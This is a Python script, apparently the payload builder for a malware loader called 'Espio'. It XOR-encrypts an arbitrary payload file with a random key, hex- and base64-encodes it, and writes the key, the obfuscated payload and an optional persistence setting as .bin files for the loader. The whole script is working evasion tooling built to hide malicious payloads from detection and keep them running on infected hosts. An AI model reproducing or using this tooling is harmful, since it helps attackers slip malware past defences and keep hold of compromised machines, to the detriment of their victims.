import os
import sys
import random
import base64


def obfuscate_payload(payload, key):
    encrypted_payload = ""
    for i in range(len(payload)):
        obf_char = chr(payload[i] ^ ord(key[i % len(key)]))
        hex_char = hex(ord(obf_char))
        if len(hex_char) == 3:
            hex_char = f"0x0{hex_char[-1]}"
        encrypted_payload += hex_char
    encrypted_payload_bytes = encrypted_payload.encode("UTF-8")
    obfuscated_payload_bytes = base64.b64encode(encrypted_payload_bytes)
    obfuscated_payload = obfuscated_payload_bytes.decode("UTF-8")
    return "".join(obfuscated_payload)


def generate_key():
    letters = [chr(ascii_value) for ascii_value in range(33, 127)]
    key = "".join(random.choices(letters, k=random.randint(100, 500)))
    return key


def persist():
    value = '0'
    answer = input('[*] Do you want to enable persistence? (Y/N) ').lower()
    if answer == 'y':
        letters = [chr(ascii_value) for ascii_value in range(97, 123)]
        value = "".join(random.choices(letters, k=random.randint(4, 10)))
        print("[+] Espio will persist")
    else:
        print("[*] Persistence will not be created")
    return value


def main():
    if len(sys.argv) == 2:
        if os.path.exists(sys.argv[1]):
            with open(sys.argv[1], "rb") as payload_file:
                payload = payload_file.read()
            key = generate_key()
            obfuscated_payload = obfuscate_payload(payload, key)
            persistence = persist()
            output_path = "loader/Espio"
            path_msg = "[+] The bin files are placed in loader/Espio"
            if not os.path.exists(output_path):
                output_path = '.'
                path_msg = "[*] WARNING: loader/Espio was not found! The bin files will be placed in the current directory"
            with open(f"{output_path}/key.bin", 'w') as key_file:
                key_file.write(key)
            with open(f"{output_path}/obfuscatedPayload.bin", 'w') as obfuscated_payload_file:
                obfuscated_payload_file.write(obfuscated_payload)
            with open (f"{output_path}/persistence.bin", 'w') as persist_file:
                persist_file.write(persistence)
            print(path_msg)
        else:
            print(f"[-] {sys.argv[1]} does not exists!")
    else:
        print("[-] Please provide the payload to obfuscate")


if __name__ == "__main__":
    main()
